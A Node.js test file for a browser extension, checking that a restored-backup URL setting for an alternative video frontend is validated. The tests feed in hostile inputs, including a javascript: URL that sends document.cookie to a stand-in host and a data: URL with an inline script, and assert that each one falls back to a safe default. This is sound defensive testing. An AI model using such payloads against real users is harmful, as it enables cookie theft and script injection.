'use strict';

// `alternativeFrontendInstance` is a bare `type: "string"` schema entry, and
// clampSettingValue does not constrain strings, so whatever a settings backup
// carries reached `a.href` by concatenation. Every sibling URL setting
// (downloadCobaltInstance, hideVideosFilterListUrl, sponsorBlockBaseUrl,
// aiSummaryEndpoint) has a real validator; this one did not.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const repoRoot = path.join(__dirname, '..');
const ytkitSource = fs.readFileSync(path.join(repoRoot, 'extension', 'ytkit.js'), 'utf8');
// Slice the feature's own object literal, balanced, so the methods run as
// written rather than being re-implemented by the test.
function featureLiteral(featureId) {
    const at = ytkitSource.indexOf("id: '" + featureId + "'");
    assert.ok(at > -1, featureId + ' must exist in ytkit.js');
    const open = ytkitSource.lastIndexOf('{', at);
    let depth = 0;
    for (let i = open; i < ytkitSource.length; i += 1) {
        const ch = ytkitSource[i];
        if (ch === '{') depth += 1;
        else if (ch === '}') {
            depth -= 1;
            if (depth === 0) return ytkitSource.slice(open, i + 1);
        }
    }
    throw new Error('unbalanced literal for ' + featureId);
}

function loadFeature(settings) {
    // eslint-disable-next-line no-new-func
    return Function('appState', 'getVideoId', 'PageTypes', 'addNavigateRule', 'removeNavigateRule',
        '"use strict"; return (' + featureLiteral('openInAlternativeFrontend') + ');')(
        { settings }, () => 'dQw4w9WgXcQ', { WATCH: 'watch' }, () => {}, () => {}
    );
}

const DEFAULT = 'https://yewtu.be';

test('a hostile scheme never reaches the link', () => {
    for (const hostile of [
        'javascript:fetch("//evil.example/"+document.cookie)',
        'data:text/html,<script>alert(1)</script>',
        'file:///C:/Windows/System32',
        'vbscript:msgbox(1)',
        'blob:https://www.youtube.com/abc'
    ]) {
        const feature = loadFeature({ alternativeFrontendInstance: hostile });
        assert.equal(feature._instance(), DEFAULT,
            `${hostile.slice(0, 24)} must fall back to the default instance`);
        assert.ok(feature._alternativeUrl().startsWith(DEFAULT + '/watch?v='),
            'the built URL must start from the validated https origin');
    }
});

test('plain http is refused as well', () => {
    // The request carries the id of the video being watched. Downgrading it to
    // cleartext is not something a restored backup should be able to arrange.
    const feature = loadFeature({ alternativeFrontendInstance: 'http://yewtu.be' });
    assert.equal(feature._instance(), DEFAULT);
});

test('a garbage or empty value falls back rather than building a relative link', () => {
    for (const value of ['', '   ', 'not a url', '//evil.example', '/watch', null, undefined, 42, {}]) {
        const feature = loadFeature({ alternativeFrontendInstance: value });
        assert.equal(feature._instance(), DEFAULT,
            `${JSON.stringify(value)} must fall back to the default instance`);
    }
});

test('a legitimate self-hosted instance still works, including a path prefix', () => {
    const cases = [
        ['https://invidious.example', 'https://invidious.example'],
        ['https://invidious.example/', 'https://invidious.example'],
        ['https://invidious.example///', 'https://invidious.example'],
        ['https://example.org/invidious', 'https://example.org/invidious'],
        ['https://example.org/invidious/', 'https://example.org/invidious'],
        ['https://invidious.example:8443', 'https://invidious.example:8443']
    ];
    for (const [configured, expected] of cases) {
        const feature = loadFeature({ alternativeFrontendInstance: configured });
        assert.equal(feature._instance(), expected, `${configured} must survive validation`);
    }
});

test('the video id is encoded into the query, never interpolated raw', () => {
    const feature = loadFeature({ alternativeFrontendInstance: 'https://invidious.example' });
    assert.equal(feature._alternativeUrl(), 'https://invidious.example/watch?v=dQw4w9WgXcQ');
    assert.ok(ytkitSource.includes('encodeURIComponent(id)'),
        'the id must stay encoded');
});

test('the button names the host it will open', () => {
    // "Open externally" alone gives no clue that a restored backup repointed
    // the button somewhere else.
    const feature = loadFeature({ alternativeFrontendInstance: 'https://example.org/invidious' });
    assert.equal(feature._instanceHost(), 'example.org');
    const attach = ytkitSource.slice(ytkitSource.indexOf('ytkit-alt-frontend-btn ytkit-stream-links-btn'));
    assert.ok(attach.slice(0, 900).includes('this._btn.title = host;'),
        'the destination host must be visible on the control');
});
